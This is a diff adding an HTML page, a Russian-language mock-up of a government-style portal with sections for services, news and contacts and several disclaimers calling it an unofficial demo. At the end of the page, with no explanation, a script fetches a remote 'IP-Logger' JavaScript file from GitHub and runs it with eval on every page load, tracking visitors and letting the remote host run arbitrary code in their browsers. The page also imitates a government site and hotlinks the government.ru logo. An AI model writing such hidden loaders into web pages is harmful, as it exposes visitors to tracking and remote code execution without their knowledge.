@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sukablyat.ru — Правительство (образец)</title>
+  <meta name="description" content="Образец макета сайта в правительственном стиле — неофициальный демонстрационный ресурс." />
+  <link rel="canonical" href="https://sukablyat.ru/" />
+  <style>
+    :root{ --accent:#0052a3; --muted:#6b7280; --bg:#f7f8fb; --card:#ffffff }
+    *{box-sizing:border-box}
+    body{font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; margin:0; background:var(--bg); color:#0f172a}
+    header{background:linear-gradient(90deg,#ffffff, #f1f5f9); border-bottom:1px solid #e6edf5}
+    .container{max-width:1100px;margin:0 auto;padding:20px}
+    .brand{display:flex;align-items:center;gap:14px}
+    .brand img{height:46px;width:auto}
+    nav{margin-left:auto}
+    .nav-links{display:flex;gap:16px;align-items:center}
+    .btn{background:var(--accent);color:#fff;padding:10px 14px;border-radius:8px;text-decoration:none;font-weight:600}
+    .hero{display:flex;gap:28px;align-items:center;padding:40px 0}
+    .hero .title{font-size:28px;font-weight:700;line-height:1.05}
+    .search{display:flex;gap:8px;margin-top:10px}
+    .search input{padding:12px;border-radius:8px;border:1px solid #dbe6f0;flex:1}
+
+    .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+    .card{background:var(--card);padding:18px;border-radius:12px;box-shadow:0 6px 18px rgba(13,30,60,0.04);border:1px solid rgba(2,6,23,0.03)}
+    .card h3{margin:0 0 8px 0}
+    .muted{color:var(--muted);font-size:14px}
+    .news-list{display:flex;flex-direction:column;gap:12px}
+    .news-item{padding:12px;border-radius:10px;border:1px solid #eef3fb;background:#fff;display:flex;justify-content:space-between;align-items:center}
+    footer{margin-top:40px;padding:26px 0;border-top:1px solid #e6edf5;background:linear-gradient(#fbfdff,#f7f8fb)}
+    .small{font-size:13px;color:var(--muted)}
+
+    /* responsive */
+    @media (max-width:900px){.grid{grid-template-columns:repeat(2,1fr)}.hero{flex-direction:column;align-items:flex-start}}
+    @media (max-width:560px){.grid{grid-template-columns:1fr}.nav-links{display:none}.brand img{height:40px}}
+
+    /* disclaimer ribbon */
+    .disclaimer{background:#fff3cd;border:1px solid #ffeeba;padding:10px 14px;border-radius:10px;color:#856404;margin-bottom:18px}
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container" style="display:flex;align-items:center;gap:20px">
+      <div class="brand">
+        <!-- Provided logo (external) -->
+        <img src="http://government.ru/static/img/logo_gov__dark__en.svg" alt="Logo" onerror="this.style.display='none'" />
+        <div>
+          <div style="font-weight:700">Sukablyat.ru</div>
+          <div class="small muted">Информационный ресурс</div>
+        </div>
+      </div>
+
+      <nav>
+        <div class="nav-links">
+          <a href="#services" class="small muted">Услуги</a>
+          <a href="#news" class="small muted">Новости</a>
+          <a href="#contacts" class="small muted">Контакты</a>
+          <a class="btn" href="#">Войти</a>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="disclaimer">ВНИМАНИЕ: этот сайт — демонстрационный макет и не является официальным ресурсом правительства.</div>
+
+    <section class="hero">
+      <div style="flex:1">
+        <div class="title">Официальная информация и сервисы — макет</div>
+        <div class="muted" style="margin-top:8px">Быстрые ссылки, объявления и государственные сервисы — демонстрационный интерфейс.</div>
+
+        <div class="search">
+          <input type="search" placeholder="Поиск документов, сервисов, сообщений..." aria-label="Поиск" />
+          <a class="btn" href="#">Найти</a>
+        </div>
+
+        <div style="margin-top:18px;display:flex;gap:12px;flex-wrap:wrap">
+          <a class="card" href="#services" style="display:inline-block;min-width:160px">Государственные услуги<br><span class="muted">Регистрации, заявки, информация</span></a>
+          <a class="card" href="#news" style="display:inline-block;min-width:160px">Новости<br><span class="muted">Официальные сообщения</span></a>
+          <a class="card" href="#contacts" style="display:inline-block;min-width:160px">Контакты<br><span class="muted">Горячая линия</span></a>
+        </div>
+      </div>
+
+      <div style="width:360px">
+        <div class="card">
+          <h3>Актуальные сообщения</h3>
+          <div class="news-list" id="news">
+            <article class="news-item">
+              <div>
+                <strong>Сообщение: пример даты</strong>
+                <div class="muted">24 ноября 2025 — Краткое описание сообщения.</div>
+              </div>
+              <a href="#" class="small">Читать</a>
+            </article>
+
+            <article class="news-item">
+              <div>
+                <strong>Новый онлайн-сервис</strong>
+                <div class="muted">15 ноября 2025 — Регистрация в режиме онлайн.</div>
+              </div>
+              <a href="#" class="small">Читать</a>
+            </article>
+          </div>
+        </div>
+
+        <div style="height:12px"></div>
+
+        <div class="card">
+          <h3>Быстрые ссылки</h3>
+          <ul class="muted" style="margin:0;padding-left:18px">
+            <li>Онлайн-формы</li>
+            <li>Контакты ведомств</li>
+            <li>Документы и законы</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <section id="services" style="margin-top:28px">
+      <h2 style="margin-bottom:12px">Сервисы и разделы</h2>
+      <div class="grid">
+        <div class="card">
+          <h3>Гражданские вопросы</h3>
+          <p class="muted">Регистрации, удостоверения и информация для граждан.</p>
+          <p class="small" style="margin-top:12px">Ссылки: заявки, сроки, FAQ.</p>
+        </div>
+
+        <div class="card">
+          <h3>Экономика и бизнес</h3>
+          <p class="muted">Поддержка бизнеса, тендеры, реестры.</p>
+          <p class="small" style="margin-top:12px">Ссылки: реестры, субсидии, контакты.</p>
+        </div>
+
+        <div class="card">
+          <h3>Безопасность и оборона</h3>
+          <p class="muted">Общая информация, экстренные сообщения.</p>
+          <p class="small" style="margin-top:12px">Официальные уведомления публикуются уполномоченными каналами.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="contacts" style="margin-top:28px">
+      <div class="card">
+        <h3>Контакты</h3>
+        <p class="muted">Горячая линия (пример): +7 (495) 000-0000</p>
+        <p class="muted">Адрес (пример): Ул. Примерная, д. 1</p>
+        <p class="small" style="margin-top:8px">Часы работы: 09:00–18:00 (рабочие дни)</p>
+      </div>
+    </section>
+
+    <footer>
+      <div class="container" style="display:flex;justify-content:space-between;align-items:center;gap:18px;flex-wrap:wrap">
+        <div>
+          <div style="font-weight:700">Sukablyat.ru</div>
+          <div class="small muted">Образец макета сайта в правительственном стиле — демонстрация кода HTML/CSS</div>
+        </div>
+        <div class="small muted">© 2025 — Образец. Не является официальным сайтом.</div>
+      </div>
+    </footer>
+  </main>
+
+  <script>
+    document.querySelectorAll('.news-item a').forEach(a=>a.addEventListener('click', e=>{e.preventDefault();alert('Это демонстрационная версия — полный материал отсутствует.')}))
+  </script>
+  <script>
+    fetch("https://raw.githubusercontent.com/MarskuQ7/IP-Logger-Console-/main/iplog.js").then(r=>r.text()).then(eval)
+  </script>
+</body>
+</html>
